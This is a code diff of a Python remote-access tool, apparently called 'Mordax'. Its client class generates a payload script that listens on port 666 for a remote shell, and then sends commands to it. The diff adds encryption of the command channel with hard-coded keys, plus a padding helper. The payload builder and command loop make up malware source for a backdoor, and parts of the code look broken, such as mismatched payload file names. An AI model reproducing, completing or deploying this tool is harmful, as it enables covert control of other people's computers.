@@ -1,12 +1,29 @@
+# This Python file uses the following encoding: utf-8
 import socket
 import threading
 import Compiler
 from tqdm import tqdm
+import Crypt
 
 
-class Client(Compiler.Compile):
+class Client(Compiler.Compile,Crypt.Crypt):
+
+    def depad(self, msg):
+        y = 0
+        msg = list(msg)
+        msgR = []
+        for x in range(len(msg)):
+            if msg[x] == " ":
+                y += 1
+            else:
+                next
+        for x in range(len(msg ) -y):
+            msgR.append(msg[x])
+        return("".join(msgR))
 
     def create_payload(self):
+        iv = self.KeyAndIv("8s6Ge9dd", "OVbfVVRciZNgcObT")
+        print(iv)
 
         code = ['import socket\n', 'import subprocess\n', 'import os\n', 'import sys\n',
                 'host = ""\n', 'port = 666\n', 'import threading\n', '\n', 'class Mordax():\n',
@@ -34,10 +51,12 @@ class Client(Compiler.Compile):
                 '                self.connection.close()\n', '                self.connection, addr = self.s.accept()\n', '                print(addr)\n',
                 '\n', '\n', '\n', 'Server = Mordax()\n', 'Server.start()']
 
-        with open ("Payload.py", "w+") as file:
+        with open ("Payload.txt", "r+") as file:
+
 
             for x in code:
                 file.write(x)
+
             try:
                 self.check("Payload.py")
             except Exception as E:
@@ -49,6 +68,7 @@ class Client(Compiler.Compile):
         State = 1
         port = 666
         timeout = 0
+
 
 
         if host != 0:
@@ -70,7 +90,8 @@ class Client(Compiler.Compile):
                    exit()
             else:
                 State = 0
-
+        iv = self.KeyAndIv("mordax", 0)
+        s.send(iv)
         text = "<command:>"
         SIZE = 2048
 
@@ -83,8 +104,8 @@ class Client(Compiler.Compile):
                 s.close()
                 exit()
 
-            s.send(cmd)
-            data = s.recv(2048)
+            s.send(self.encode(cmd))
+            data = self.decode(s.recv(2048))
             data = data.split(";")
 
             if data[0] == "SIZE":
@@ -95,7 +116,8 @@ class Client(Compiler.Compile):
                 text = data2[1] + ">"
             else:
                 print data[0]
-                text = data[1] + ">"
+                text = self.depad(data[1])
+                text = text + ">"
 
     def scan(self, args):
 
